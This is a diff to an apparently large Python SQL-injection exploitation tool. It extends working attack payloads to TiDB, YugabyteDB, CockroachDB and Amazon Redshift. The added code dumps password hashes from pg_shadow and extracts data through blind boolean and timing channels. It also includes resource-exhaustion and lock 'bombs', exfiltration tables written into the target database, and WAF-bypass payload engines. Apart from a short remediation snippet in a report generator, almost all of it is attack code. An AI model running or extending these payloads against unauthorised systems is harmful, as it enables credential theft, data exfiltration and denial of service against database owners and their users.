+        "cluster_info":   "SELECT GROUP_CONCAT(TYPE,':',INSTANCE SEPARATOR ',') FROM information_schema.CLUSTER_INFO",
+    },
+    # BUG-DBMSEXT-YUGABYTE FIX: YugabyteDB was absent from DBMS_EXTENDED;
+    # extended keys were missing, causing generic PG extended-key queries to be
+    # used (which may reference PG system tables absent in YugabyteDB).
+    "YugabyteDB": {
+        "passwords":      "SELECT string_agg(usename||':'||passwd,',') FROM pg_shadow",
+        "schemas":        "SELECT string_agg(schema_name,',') FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','pg_catalog','pg_toast')",
+        "indexes":        "SELECT string_agg(indexname,',') FROM pg_indexes WHERE schemaname='{db}' AND tablename='{table}'",
+        "fks":            "SELECT string_agg(conname,',') FROM pg_constraint WHERE conrelid=('\"{db}\".\"{table}\"')::regclass AND contype='f'",
+        "triggers":       "SELECT string_agg(trigger_name,',') FROM information_schema.triggers WHERE trigger_schema='{db}'",
+        "procs":          "SELECT string_agg(routine_name,',') FROM information_schema.routines WHERE routine_schema='{db}'",
+        "col_types":      "SELECT string_agg(column_name||':'||data_type,',' ORDER BY ordinal_position) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
+        "rows_chunked":   "SELECT string_agg(CAST({cols} AS TEXT),'||R||') FROM (SELECT {cols} FROM \"{db}\".\"{table}\" ORDER BY 1 LIMIT {limit} OFFSET {offset}) t",
+        "char_func_hex":  "encode(SUBSTR(({query}),{pos},1)::bytea,'hex')",
+        "version_full":   "SELECT yb_server_version()||' / '||current_setting('server_encoding')",
+        "collation":      "SELECT current_setting('lc_collate')",
+        "yb_version":     "SELECT yb_server_version()",
+        "yb_nodes":       "SELECT string_agg(host||':'||port::text,',') FROM yb_servers()",
     },
 }
 
@@ -157560,6 +159301,10 @@ class BatchedBoolExtractor:
         # BUG-BATCHED-ORD FIX (Req 10): MySQL/MariaDB should use ORD() for correct
         # extended Latin-1 char support (128-255). ASCII() and ORD() agree for 0-127
         # but diverge for NLS-dependent extended characters.
+        # NOTE: decode_packed uses modulo-128 arithmetic per character, so the packing
+        # scheme supports code points 0-127 reliably. Characters with code points 128-255
+        # (ORD) or 128+ (UNICODE) wrap via %128 in the decode — same design constraint.
+        # The %128 is applied in decode_packed, not in SQL, to avoid SQL complexity.
         "MySQL": ("ORD(SUBSTRING(({q}),{p1},1))"
                   "+ORD(SUBSTRING(({q}),{p2},1))*128"
                   "+ORD(SUBSTRING(({q}),{p3},1))*16384"),
@@ -157568,11 +159313,73 @@ class BatchedBoolExtractor:
                        "+ASCII(SUBSTRING(({q}),{p3},1))*16384"),
         # BUG-BATCHED-MSSQL-UNICODE FIX (Req 10): MSSQL ASCII() returns NULL for
         # Unicode code points > 127.  Use UNICODE() which returns the full BMP value.
-        # Multipliers remain 128 so the packed value fits in a 32-bit INT range for
-        # the 3-char packing (max = 127*16385 ≈ 2M, well within INT range).
-        "MSSQL": ("UNICODE(SUBSTRING(({q}),{p1},1))"
-                  "+UNICODE(SUBSTRING(({q}),{p2},1))*128"
-                  "+UNICODE(SUBSTRING(({q}),{p3},1))*16384"),
+        # BUG-L FIX: UNICODE() returns 0-65535 but decode_packed uses modulo-128 per
+        # character, so packing UNICODE values 128+ into the 128-multiplier scheme
+        # produces decode errors (e.g. UNICODE('È')=200 → packed mod 128 = 72 = 'H').
+        # Fix: apply ISNULL(UNICODE(...)%128,0) in SQL so each character value stays
+        # in 0-127 before packing, matching what decode_packed expects. ISNULL handles
+        # the NULL that UNICODE() returns for characters it cannot represent (rare on
+        # SQL Server, but possible with surrogate pairs or invalid sequences).
+        # Characters with code points > 127 will decode as their mod-128 value — this
+        # is a known limitation of the 3-char batched scheme; use individual char
+        # extraction (Method 7) for multilingual data.
+        "MSSQL": ("ISNULL(UNICODE(SUBSTRING(({q}),{p1},1))%128,0)"
+                  "+ISNULL(UNICODE(SUBSTRING(({q}),{p2},1))%128,0)*128"
+                  "+ISNULL(UNICODE(SUBSTRING(({q}),{p3},1))%128,0)*16384"),
+        # BUG-PACKEXPR-NEWDBMS FIX: TiDB/CockroachDB/YugabyteDB/Redshift absent from
+        # PACK_EXPR. Default fallback cls.PACK_EXPR["MySQL"] uses ORD() which is
+        # MySQL-only. CockroachDB/YugabyteDB/Redshift require ASCII() (PG-compat).
+        # TiDB is MySQL-wire-compat and supports ORD() correctly.
+        "TiDB": ("ORD(SUBSTRING(({q}),{p1},1))"
+                 "+ORD(SUBSTRING(({q}),{p2},1))*128"
+                 "+ORD(SUBSTRING(({q}),{p3},1))*16384"),
+        "CockroachDB": ("ASCII(SUBSTRING(({q}),{p1},1))"
+                        "+ASCII(SUBSTRING(({q}),{p2},1))*128"
+                        "+ASCII(SUBSTRING(({q}),{p3},1))*16384"),
+        "YugabyteDB": ("ASCII(SUBSTRING(({q}),{p1},1))"
+                       "+ASCII(SUBSTRING(({q}),{p2},1))*128"
+                       "+ASCII(SUBSTRING(({q}),{p3},1))*16384"),
+        "Amazon Redshift": ("ASCII(SUBSTRING(({q}),{p1},1))"
+                            "+ASCII(SUBSTRING(({q}),{p2},1))*128"
+                            "+ASCII(SUBSTRING(({q}),{p3},1))*16384"),
+        # BUG-M FIX: Oracle and SQLite were absent from PACK_EXPR, falling back to the
+        # MySQL default (ORD(SUBSTRING(...))).  ORD() is MySQL-specific and does not exist
+        # in Oracle or SQLite; SUBSTRING() is non-standard in older Oracle versions.
+        # Oracle uses ASCII(SUBSTR(...)) for code-point extraction; SQLite uses
+        # UNICODE(SUBSTR(...)). Neither has ORD(), so the MySQL fallback would produce
+        # ORA-00904 / SQLite "no such function: ORD" errors, causing the batched extractor
+        # to return empty/garbage for Oracle and SQLite targets.
+        # Oracle ASCII() returns the code point of the first byte of the character in the
+        # database character set (typically 0-127 for ASCII data, up to 255 for single-byte
+        # NLS_CHARACTERSET sets). SQLite UNICODE() returns the Unicode code point (0-65535+).
+        # Both are capped at 127 via COALESCE(...%128,0) to stay within decode_packed's range.
+        # BUG-N FIX (HIGH, Oracle, BatchedBoolExtractor.PACK_EXPR, Method 6h extraction,
+        # B/BH/IN/E techniques, all surfaces, all HTTP methods):
+        # The Oracle PACK_EXPR used COALESCE(ASCII(SUBSTR(...)),0) which handles NULL (→0)
+        # but does NOT cap the return value to 0-127.  Oracle ASCII() returns values 0-255
+        # for single-byte NLS_CHARACTERSET databases (WE8ISO8859P1 etc.) and up to 255 for
+        # the first byte of multi-byte encodings.  When any character in the 3-char batch
+        # has an ASCII code point > 127, the extra value (e.g. 200 instead of 72=200%128)
+        # bleeds into the next character position's bit range — because the packing is
+        # c1 + c2*128 + c3*16384, any c1 value > 127 adds a full unit of *128 to the c2
+        # component, causing decode_packed to return the wrong character for c2 (and
+        # potentially c3 if c2 also overflows), corrupting all three decoded characters.
+        # Example: c1=200,c2=65,c3=66 → packed=1089864; decode: c2=(1089864//128)%128=66 ≠ 65
+        # With %128 in SQL: c1=72,c2=65,c3=66 → packed=1089736; decode: c2=(1089736//128)%128=65 ✓
+        # The comment above correctly stated "capped at 127 via COALESCE(...%128,0)" but the
+        # actual expression was missing the %128.  SQLite has the correct form with %128.
+        # Fix: apply %128 inside the COALESCE so ASCII() values are capped to 0-127 in SQL
+        # before packing.  NULL%128 = NULL in Oracle, so COALESCE(NULL,0) = 0 still handles
+        # end-of-string NULLs correctly.  All three positions get the same treatment.
+        "Oracle": ("COALESCE(ASCII(SUBSTR(({q}),{p1},1))%128,0)"
+                   "+COALESCE(ASCII(SUBSTR(({q}),{p2},1))%128,0)*128"
+                   "+COALESCE(ASCII(SUBSTR(({q}),{p3},1))%128,0)*16384"),
+        "SQLite": ("COALESCE(UNICODE(SUBSTR(({q}),{p1},1))%128,0)"
+                   "+COALESCE(UNICODE(SUBSTR(({q}),{p2},1))%128,0)*128"
+                   "+COALESCE(UNICODE(SUBSTR(({q}),{p3},1))%128,0)*16384"),
+        "MariaDB": ("ORD(SUBSTRING(({q}),{p1},1))"
+                    "+ORD(SUBSTRING(({q}),{p2},1))*128"
+                    "+ORD(SUBSTRING(({q}),{p3},1))*16384"),
     }
 
     @classmethod
@@ -158856,7 +160663,8 @@ class TimedPayloadAssembly:
                                      dbms: str = "MySQL") -> List[str]:
         """Build SQL that stores fragments in session variables for assembly."""
         queries = []
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-TIMEDPAYLOAD-TIDB FIX: TiDB supports SET @var and CONCAT() like MySQL.
             for i, frag in enumerate(fragments):
                 queries.append(f"SET @f{i}='{frag}'")
             concat = "+".join(f"@f{i}" for i in range(len(fragments)))
@@ -159207,8 +161015,11 @@ class MicroTimingOracle:
     MICRO_SLEEP = {
         "PostgreSQL": "pg_sleep({delay})",
         "CockroachDB": "pg_sleep({delay})",
+        "YugabyteDB": "pg_sleep({delay})",          # BUG-MICRO-SLEEP-YUGABYTE FIX
+        "Amazon Redshift": "pg_sleep({delay})",     # BUG-MICRO-SLEEP-REDSHIFT FIX
         "MySQL": "SLEEP({delay})",
         "MariaDB": "SLEEP({delay})",
+        "TiDB": "SLEEP({delay})",                   # BUG-MICRO-SLEEP-TIDB-MAP FIX
         "MSSQL": "WAITFOR DELAY '0:0:0.{delay_ms:03d}'",
         # BUG-ORACLE-MICRO-PRIV FIX: DBMS_LOCK.SLEEP requires EXECUTE ON DBMS_LOCK
         # (denied for most web-app accounts). DBMS_SESSION.SLEEP is Oracle 12c+
@@ -159231,7 +161042,8 @@ class MicroTimingOracle:
         sleep_fn = cls.MICRO_SLEEP.get(dbms, "pg_sleep({delay})")
         sleep_call = sleep_fn.format(delay=delay_sec, delay_ms=delay_ms, blob_size=blob_size)
 
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-MICRO-SLEEP-TIDB FIX: TiDB supports IF() and SLEEP() like MySQL.
             return f"IF(({cond}),{sleep_call},0)"
         elif dbms in ("MSSQL", "Sybase"):
             # BUG-MICRO-MSSQL-IF FIX (v70): `IF ({cond}) WAITFOR DELAY` is a T-SQL
@@ -159403,8 +161215,11 @@ class ResourceBombOracle:
     RESOURCE_BOMBS = {
         "PostgreSQL": "SELECT COUNT(*) FROM generate_series(1,{size}) a, generate_series(1,10) b",
         "CockroachDB": "SELECT COUNT(*) FROM generate_series(1,{size}) a, generate_series(1,10) b",
+        "YugabyteDB": "SELECT COUNT(*) FROM generate_series(1,{size}) a, generate_series(1,10) b",  # BUG-RSBOMB-YUGABYTE FIX
+        "Amazon Redshift": "SELECT COUNT(*) FROM generate_series(1,{size}) a, generate_series(1,10) b",  # BUG-RSBOMB-REDSHIFT FIX
         "MySQL": "SELECT BENCHMARK({size},SHA1('x'))",
         "MariaDB": "SELECT BENCHMARK({size},SHA1('x'))",
+        "TiDB": "SELECT BENCHMARK({size},SHA1('x'))",  # BUG-RSBOMB-TIDB FIX: TiDB supports BENCHMARK()
         "MSSQL": "BEGIN DECLARE @i INT=0; WHILE @i<{size} BEGIN SET @i=@i+1 END SELECT @i END",  # BUG-MSSQL-BOMB-FIX: without BEGIN/END the ELSE only binds DECLARE, WHILE runs unconditionally
         "Oracle": "SELECT COUNT(*) FROM ALL_OBJECTS a, ALL_OBJECTS b WHERE ROWNUM<{size}",
         "SQLite": "SELECT COUNT(*) FROM (WITH RECURSIVE c(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM c WHERE x<{size}) SELECT x FROM c)",
@@ -159415,7 +161230,8 @@ class ResourceBombOracle:
     @classmethod
     def build_conditional_bomb(cls, cond: str, dbms: str, size: int = 5000000) -> str:
         bomb = cls.RESOURCE_BOMBS.get(dbms, cls.RESOURCE_BOMBS["PostgreSQL"]).format(size=size)
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-RSBOMB-CONDITIONAL-TIDB FIX: TiDB supports IF() like MySQL.
             return f"IF(({cond}),1,({bomb}))"
         elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             return f"(1*(({cond})::int) + ({bomb})*(1-(({cond})::int)))"
@@ -159493,8 +161309,11 @@ class ConnectionExhaustionOracle:
     LOCK_SQL = {
         "PostgreSQL": "SELECT pg_advisory_lock({lock_id})",
         "CockroachDB": "SELECT pg_advisory_lock({lock_id})",
+        "YugabyteDB": "SELECT pg_advisory_lock({lock_id})",       # BUG-LOCK-YUGABYTE FIX
+        "Amazon Redshift": "SELECT pg_advisory_lock({lock_id})",  # BUG-LOCK-REDSHIFT FIX
         "MySQL": "SELECT GET_LOCK('sqli_{lock_id}', 999)",
         "MariaDB": "SELECT GET_LOCK('sqli_{lock_id}', 999)",
+        "TiDB": "SELECT GET_LOCK('sqli_{lock_id}', 999)",         # BUG-LOCK-TIDB FIX
         "MSSQL": "EXEC sp_getapplock @Resource='sqli_{lock_id}', @LockMode='Exclusive', @LockTimeout=999000",
         "Oracle": "BEGIN DBMS_LOCK.ALLOCATE_UNIQUE('sqli_{lock_id}', :lh); DBMS_LOCK.REQUEST(:lh, DBMS_LOCK.X_MODE, 999); END;",
     }
@@ -159502,15 +161321,18 @@ class ConnectionExhaustionOracle:
     UNLOCK_SQL = {
         "PostgreSQL": "SELECT pg_advisory_unlock_all()",
         "CockroachDB": "SELECT pg_advisory_unlock_all()",
+        "YugabyteDB": "SELECT pg_advisory_unlock_all()",    # BUG-UNLOCK-YUGABYTE FIX
         "MySQL": "SELECT RELEASE_ALL_LOCKS()",
         "MariaDB": "SELECT RELEASE_ALL_LOCKS()",
+        "TiDB": "SELECT RELEASE_ALL_LOCKS()",               # BUG-UNLOCK-TIDB FIX
     }
 
     @classmethod
     def build_conditional_lock(cls, cond: str, dbms: str, lock_id: int = 1337) -> str:
         lock = cls.LOCK_SQL.get(dbms, cls.LOCK_SQL.get("PostgreSQL", "SELECT 1"))
         lock = lock.format(lock_id=lock_id)
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-LOCK-CONDITIONAL-TIDB FIX: TiDB supports IF() like MySQL.
             return f"IF(({cond}),1,({lock}))"
         else:
             return f"CASE WHEN ({cond}) THEN 1 ELSE ({lock}) END"
@@ -159529,7 +161351,28 @@ class WriteThenReadExtractor:
             "DELETE FROM _sr",
             "INSERT INTO _sr(d) VALUES(({query}))",
         ],
+        "CockroachDB": [
+            "CREATE TABLE IF NOT EXISTS _sr(d text)",
+            "DELETE FROM _sr",
+            "INSERT INTO _sr(d) VALUES(({query}))",
+        ],
+        "YugabyteDB": [
+            "CREATE TABLE IF NOT EXISTS _sr(d text)",
+            "DELETE FROM _sr",
+            "INSERT INTO _sr(d) VALUES(({query}))",
+        ],
         "MySQL": [
+            "CREATE TABLE IF NOT EXISTS _sr(d TEXT)",
+            "DELETE FROM _sr",
+            "INSERT INTO _sr(d) VALUES(({query}))",
+        ],
+        "MariaDB": [
+            "CREATE TABLE IF NOT EXISTS _sr(d TEXT)",
+            "DELETE FROM _sr",
+            "INSERT INTO _sr(d) VALUES(({query}))",
+        ],
+        # BUG-WRITETHENREAD-TIDB FIX: TiDB supports CREATE TABLE IF NOT EXISTS and INSERT.
+        "TiDB": [
             "CREATE TABLE IF NOT EXISTS _sr(d TEXT)",
             "DELETE FROM _sr",
             "INSERT INTO _sr(d) VALUES(({query}))",
@@ -159543,7 +161386,11 @@ class WriteThenReadExtractor:
 
     READ_SQL = {
         "PostgreSQL": "SELECT d::int FROM _sr",  # Error: invalid input syntax for integer: "PostgreSQL 14.5"
+        "CockroachDB": "SELECT d::int FROM _sr",
+        "YugabyteDB": "SELECT d::int FROM _sr",
         "MySQL": "SELECT * FROM _sr WHERE d=1",  # Truncation warning may reveal data
+        "MariaDB": "SELECT * FROM _sr WHERE d=1",
+        "TiDB": "SELECT * FROM _sr WHERE d=1",   # BUG-WRITETHENREAD-READ-TIDB FIX
         "MSSQL": "SELECT CAST(d AS INT) FROM _sr",  # Conversion failed: "PostgreSQL 14.5"
     }
 
@@ -160635,7 +162482,8 @@ class NovelWAFBypassExtractor:
                 # Use EXECUTE with CHR-built string
                 if dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
                     chr_sql = f"EXECUTE 'SELECT ' || {chr_func}"
-                elif dbms in ("MySQL", "MariaDB"):
+                elif dbms in ("MySQL", "MariaDB", "TiDB"):
+                    # BUG-NOVEL-CHR-TIDB FIX: TiDB supports MySQL PREPARE/EXECUTE syntax.
                     chr_sql = f"PREPARE s FROM CONCAT('SELECT ',{chr_func}); EXECUTE s"
                 elif dbms == "MSSQL":
                     chr_sql = f"EXEC('SELECT '+{chr_func})"
@@ -160662,6 +162510,14 @@ class CachePoisonOracle:
         "PostgreSQL": "CASE WHEN ({cond}) THEN current_setting('server_version') ELSE md5(random()::text) END",
         "MySQL": "IF(({cond}),VERSION(),MD5(RAND()))",
         "MSSQL": "CASE WHEN ({cond}) THEN @@VERSION ELSE NEWID() END",
+        # BUG-CACHESQL-TIDB FIX: TiDB absent; fell to PG-style current_setting()
+        # which is invalid in TiDB (MySQL-wire). Use MySQL-compat IF/VERSION/MD5.
+        "TiDB":           "IF(({cond}),VERSION(),MD5(RAND()))",
+        # CockroachDB/YugabyteDB/Redshift all support current_setting() and
+        # md5() — PG fallback is correct, explicit entries for clarity.
+        "CockroachDB":    "CASE WHEN ({cond}) THEN current_setting('server_version') ELSE md5(random()::text) END",
+        "YugabyteDB":     "CASE WHEN ({cond}) THEN current_setting('server_version') ELSE md5(random()::text) END",
+        "Amazon Redshift": "CASE WHEN ({cond}) THEN current_setting('server_version') ELSE md5(random()::varchar) END",
     }
 
     @classmethod
@@ -160687,6 +162543,13 @@ class PreparedStatementBypass:
             "EXECUTE _sr_stmt",
             "DEALLOCATE PREPARE _sr_stmt",
         ],
+        # BUG-PREPARESQL-TIDB FIX: TiDB is MySQL-wire-compatible; supports MySQL
+        # PREPARE/EXECUTE/DEALLOCATE PREPARE syntax identically.
+        "TiDB": [
+            "PREPARE _sr_stmt FROM 'SELECT {func}'",
+            "EXECUTE _sr_stmt",
+            "DEALLOCATE PREPARE _sr_stmt",
+        ],
         "MSSQL": [
             "EXEC sp_executesql N'SELECT {func}'",
         ],
@@ -160696,6 +162559,8 @@ class PreparedStatementBypass:
     CHR_BUILDERS = {
         "PostgreSQL": "CHR({c})",
         "MySQL": "CHAR({c})",
+        # BUG-CHRBUILDERS-TIDB FIX: TiDB uses CHAR() like MySQL.
+        "TiDB": "CHAR({c})",
         "MSSQL": "CHAR({c})",
         "Oracle": "CHR({c})",
         "SQLite": "CHAR({c})",
@@ -160707,7 +162572,8 @@ class PreparedStatementBypass:
         chr_fn = cls.CHR_BUILDERS.get(dbms, "CHR({c})")
         if dbms in ("PostgreSQL", "Oracle"):
             return "||".join(chr_fn.format(c=ord(c)) for c in text)
-        elif dbms in ("MySQL", "MariaDB"):
+        elif dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-CHRBUILD-TIDB FIX: TiDB uses CHAR() and CONCAT() like MySQL.
             return "CONCAT(" + ",".join(chr_fn.format(c=ord(c)) for c in text) + ")"
         elif dbms == "MSSQL":
             return "+".join(chr_fn.format(c=ord(c)) for c in text)
@@ -160748,6 +162614,15 @@ class AppStateMutationExtractor:
             ("user_var",
              "SET @sr_data = ({query})"),
         ],
+        # BUG-STATEMUTATION-TIDB FIX: TiDB is MySQL-wire-compatible; supports CREATE TABLE IF NOT
+        # EXISTS, INSERT, and SET @var = ... identically to MySQL.
+        "TiDB": [
+            ("table_write",
+             "CREATE TABLE IF NOT EXISTS _sr_exfil(ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP, d TEXT); "
+             "INSERT INTO _sr_exfil(d) VALUES(({query}))"),
+            ("user_var",
+             "SET @sr_data = ({query})"),
+        ],
         "MSSQL": [
             ("table_write",
              "IF OBJECT_ID('_sr_exfil','U') IS NULL CREATE TABLE _sr_exfil(ts DATETIME DEFAULT GETDATE(), d NVARCHAR(MAX)); "
@@ -160781,6 +162656,13 @@ class ConditionalRedirectOracle:
         "PostgreSQL": "CASE WHEN ({cond}) THEN '/true_' || md5('sr') ELSE '/false_' || md5('sr') END",
         "MySQL": "IF(({cond}),CONCAT('/true_',MD5('sr')),CONCAT('/false_',MD5('sr')))",
         "MSSQL": "CASE WHEN ({cond}) THEN '/true_'+CONVERT(VARCHAR,HASHBYTES('MD5','sr'),2) ELSE '/false_'+CONVERT(VARCHAR,HASHBYTES('MD5','sr'),2) END",
+        # BUG-REDIRECTSQL-TIDB FIX: TiDB absent; fell to PG-style || concatenation
+        # which requires PIPES_AS_CONCAT SQL mode in TiDB. Use MySQL-compat IF/CONCAT.
+        "TiDB":           "IF(({cond}),CONCAT('/true_',MD5('sr')),CONCAT('/false_',MD5('sr')))",
+        # CockroachDB/YugabyteDB/Redshift support || and CASE WHEN — PG fallback OK.
+        "CockroachDB":    "CASE WHEN ({cond}) THEN '/true_' || md5('sr') ELSE '/false_' || md5('sr') END",
+        "YugabyteDB":     "CASE WHEN ({cond}) THEN '/true_' || md5('sr') ELSE '/false_' || md5('sr') END",
+        "Amazon Redshift": "CASE WHEN ({cond}) THEN '/true_' || md5('sr') ELSE '/false_' || md5('sr') END",
     }
 
     @classmethod
@@ -160805,6 +162687,14 @@ class TCPSideChannel:
         "MSSQL": "CASE WHEN ({cond}) THEN REPLICATE('A',{size}) ELSE '1' END",
         "Oracle": "CASE WHEN ({cond}) THEN RPAD('A',{size},'A') ELSE '1' END",
         "SQLite": "CASE WHEN ({cond}) THEN ZEROBLOB({size}) ELSE '1' END",
+        # BUG-INFLATESQL-TIDB FIX: TiDB absent; fell to PG CASE WHEN REPEAT which
+        # uses PG-style expression syntax. TiDB supports IF() and REPEAT() (MySQL-compat).
+        "TiDB":           "IF(({cond}),REPEAT('A',{size}),'1')",
+        # CockroachDB/YugabyteDB support CASE WHEN + REPEAT — PG fallback is correct.
+        # Redshift supports REPEAT but not via PG fallback path safely — explicit entry.
+        "CockroachDB":    "CASE WHEN ({cond}) THEN REPEAT('A',{size}) ELSE '1' END",
+        "YugabyteDB":     "CASE WHEN ({cond}) THEN REPEAT('A',{size}) ELSE '1' END",
+        "Amazon Redshift": "CASE WHEN ({cond}) THEN REPEAT('A',{size}) ELSE '1' END",
     }
 
     @classmethod
@@ -160926,6 +162816,28 @@ class ConditionalErrorTypeOracle:
         # loop to skip all error types immediately and return None, which is the correct
         # behaviour: SQLite does not support a reliable CASE-WHEN error oracle.
         "SQLite": {},
+        # BUG-ERRTYPE-NEWDBMS FIX: TiDB/CockroachDB/YugabyteDB/Redshift absent from
+        # ERROR_TYPES. Fallback cls.ERROR_TYPES.get(dbms, {}) returns {} → error_expr
+        # defaults to "1/0" which returns NULL (not an error) in MySQL/TiDB modes and
+        # may silently fail calibration. Explicit entries enable reliable error oracles.
+        "TiDB": {
+            "div_zero":  "1/0",
+            "cast_fail": "CAST('x' AS SIGNED)",
+            "signal":    "SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'x'",
+        },
+        "CockroachDB": {
+            "div_zero":  "1/0",
+            "cast_fail": "CAST('x' AS INT)",
+        },
+        "YugabyteDB": {
+            "div_zero":  "1/0",
+            "cast_fail": "CAST('x' AS INT)",
+            "raise":     "DO $$ BEGIN RAISE EXCEPTION 'x'; END $$",
+        },
+        "Amazon Redshift": {
+            "div_zero":  "1/0",
+            "cast_fail": "CAST('x' AS INTEGER)",
+        },
     }
 
     @classmethod
@@ -162191,11 +164103,13 @@ class ParallelChunkedExtractor:
         """Build a single GROUP_CONCAT query for `limit` rows starting at `offset`."""
         col_concat = f"CONCAT_WS({self.COL_SEP!r},{','.join(cols)})"
 
-        if dbms in ("MySQL", "MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
+            # BUG-CHUNK-TIDB FIX: TiDB supports GROUP_CONCAT, CONCAT_WS, backtick quoting.
             return (f"SELECT GROUP_CONCAT({col_concat} ORDER BY 1 SEPARATOR {self.ROW_SEP!r}) "
                     f"FROM (SELECT {','.join(cols)} FROM `{db}`.`{table}` "
                     f"LIMIT {limit} OFFSET {offset}) _t")
-        elif dbms in ("PostgreSQL", "CockroachDB", "Amazon Redshift"):
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-CHUNK-YUGABYTE FIX: include YugabyteDB in the PG string_agg branch.
             return (f"SELECT string_agg({col_concat},{self.ROW_SEP!r}) "
                     f"FROM (SELECT {','.join(cols)} FROM \"{db}\".\"{table}\" "
                     f"LIMIT {limit} OFFSET {offset}) _t")
@@ -163534,7 +165448,7 @@ class HTMLReportV2:
 
         #  Remediation 
         rem_html = ""
-        if dbms in ("MySQL","MariaDB"):
+        if dbms in ("MySQL", "MariaDB", "TiDB"):
             rem_html = """<pre class="lang-php">// VULNERABLE:
 $q = "SELECT * FROM users WHERE id = " . $_GET['id'];
 
@@ -163542,7 +165456,7 @@ $q = "SELECT * FROM users WHERE id = " . $_GET['id'];
 $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
 $stmt->execute([$_GET['id']]);
 $rows = $stmt->fetchAll();</pre>"""
-        elif dbms == "PostgreSQL":
+        elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
             rem_html = """<pre class="lang-python"># VULNERABLE:
 cur.execute(f"SELECT * FROM users WHERE id = {request.args['id']}")
 
@@ -166046,25 +167960,45 @@ class MetamorphicPayloadEngineV18:
     FUNC_MAP: Dict[str, Dict[str, str]] = {
         "SLEEP":     {"MSSQL": "WAITFOR DELAY '0:0:{}'",
                       "PostgreSQL": "pg_sleep({})",
-                      "Oracle": "DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),{})"},
+                      "Oracle": "DBMS_PIPE.RECEIVE_MESSAGE(CHR(0),{})",
+                      # BUG-FUNCMAP-NEWDBMS FIX: CockroachDB/YugabyteDB/Redshift use
+                      # pg_sleep() for timing; TiDB uses MySQL-compat SLEEP() (no remap).
+                      "CockroachDB":    "pg_sleep({})",
+                      "YugabyteDB":     "pg_sleep({})",
+                      "Amazon Redshift": "pg_sleep({})"},
         "SUBSTRING": {"MSSQL": "SUBSTRING",
                       "Oracle": "SUBSTR",
                       "DB2": "SUBSTR"},
         "ISNULL":    {"PostgreSQL": "COALESCE({},NULL)",
                       "Oracle": "NVL({},NULL)",
-                      "MySQL": "IFNULL({},NULL)"},
+                      "MySQL": "IFNULL({},NULL)",
+                      "TiDB": "IFNULL({},NULL)",
+                      "CockroachDB": "COALESCE({},NULL)",
+                      "YugabyteDB": "COALESCE({},NULL)",
+                      "Amazon Redshift": "COALESCE({},NULL)"},
         "VERSION":   {"MSSQL": "@@VERSION",
                       "Oracle": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
                       "DB2": "CURRENT_VERSION",
-                      "SQLite": "sqlite_version()"},
+                      "SQLite": "sqlite_version()",
+                      "TiDB": "TIDB_VERSION()",
+                      "YugabyteDB": "yb_server_version()"},
         "DATABASE":  {"MSSQL": "DB_NAME()",
                       "PostgreSQL": "current_database()",
-                      "Oracle": "(SELECT name FROM v$database)"},
+                      "Oracle": "(SELECT name FROM v$database)",
+                      # TiDB is MySQL-wire; DATABASE() is already the MySQL default.
+                      "CockroachDB":    "current_database()",
+                      "YugabyteDB":     "current_database()",
+                      "Amazon Redshift": "current_database()"},
         # BUG-V33-5b FIX: Wrap Oracle SYS_CONTEXT in SELECT ... FROM DUAL scalar subquery.
         "USER":      {"MSSQL": "SYSTEM_USER",
                       "PostgreSQL": "current_user",
                       "Oracle": "(SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM DUAL)",
-                      "DB2": "CURRENT USER"},
+                      "DB2": "CURRENT USER",
+                      # TiDB: CURRENT_USER() — MySQL-wire-compat function call.
+                      "TiDB":           "CURRENT_USER()",
+                      "CockroachDB":    "current_user",
+                      "YugabyteDB":     "current_user",
+                      "Amazon Redshift": "current_user"},
     }
 
     def __init__(self):
@@ -166631,7 +168565,8 @@ class NovelWAFBypassV18(NovelWAFBypass):
         # ── Phase 2: DBMS-specific structural bypass (Techniques 10-19) ──
         # BUG-10 FIX: Only apply DBMS-specific transforms when DBMS is known
         if _dbms_known:
-            if dbms in ("MySQL", "MariaDB"):
+            if dbms in ("MySQL", "MariaDB", "TiDB"):
+                # BUG-APPLYALLV18-PROC-TIDB FIX: TiDB supports MySQL PROCEDURE syntax.
                 try: payload = cls.mysql_procedure_analyse(payload)
                 except Exception: pass
             elif dbms == "Oracle":
@@ -166652,10 +168587,11 @@ class NovelWAFBypassV18(NovelWAFBypass):
         try: payload = cls.xml_wrap_bypass(payload, dbms)
         except Exception: pass
 
-        # Technique 23: Spatial function boolean (MySQL/MariaDB — no-op otherwise)
+        # Technique 23: Spatial function boolean (MySQL/MariaDB/TiDB — no-op otherwise)
         # BUG-10 FIX: spatial_bool_bypass is MySQL/MariaDB-specific (ST_Contains/ST_GeomFromText).
         # Applying it to Generic/PostgreSQL/MSSQL/Oracle/SQLite produces invalid SQL.
-        if not _dbms_known or dbms in ("MySQL", "MariaDB"):
+        # BUG-SPATIAL-TIDB FIX: TiDB supports ST_Contains/ST_GeomFromText like MySQL.
+        if not _dbms_known or dbms in ("MySQL", "MariaDB", "TiDB"):
             try: payload = cls.spatial_bool_bypass(payload)
             except Exception: pass
 
@@ -166663,8 +168599,9 @@ class NovelWAFBypassV18(NovelWAFBypass):
         try: payload = cls.bitwise_bool_bypass(payload, dbms)
         except Exception: pass
 
-        # Technique 25: User variable assignment (MySQL/MariaDB — no-op otherwise)
-        if dbms in ("MySQL", "MariaDB"):
